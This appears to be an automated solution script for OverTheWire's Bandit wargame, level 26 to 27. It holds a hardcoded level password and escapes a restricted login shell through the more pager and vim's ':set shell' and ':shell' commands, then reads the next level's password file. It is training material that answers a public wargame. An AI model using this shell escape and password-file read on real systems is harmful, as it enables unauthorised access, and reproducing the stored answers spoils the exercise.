print("[*] Bandit Level 26 -> 27: Getting Real Shell")

let pass = "s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ"

print("[*] Connect")
let ssh = connect_ssh_pty("bandit.labs.overthewire.org", 2220, "bandit26", pass, 3, 20)
ssh_interactive_start(ssh)

print("[*] Get --More--")
let initial = ssh_interactive_recv(ssh, 1500)

print("[*] Enter Vim")
ssh_interactive_send(ssh, "v")
let vim = ssh_interactive_recv(ssh, 1000)

print("[*] Press ENTER")
ssh_interactive_send(ssh, "\r")
let r1 = ssh_interactive_recv(ssh, 500)

print("[*] Set shell to bash")
ssh_interactive_send(ssh, ":set shell=/bin/bash\r")
let r2 = ssh_interactive_recv(ssh, 500)

print("[*] Spawn shell")
ssh_interactive_send(ssh, ":shell\r")
let r3 = ssh_interactive_recv(ssh, 1000)

print("\n========== AFTER :shell ==========")
print(r3)
print("===================================\n")

print("[*] Now cat the password")
ssh_interactive_send(ssh, "cat /etc/bandit_pass/bandit27\r")
let password = ssh_interactive_recv(ssh, 1000)

print("\n========== PASSWORD ==========")
print(password)
print("==============================\n")

ssh_interactive_close(ssh)
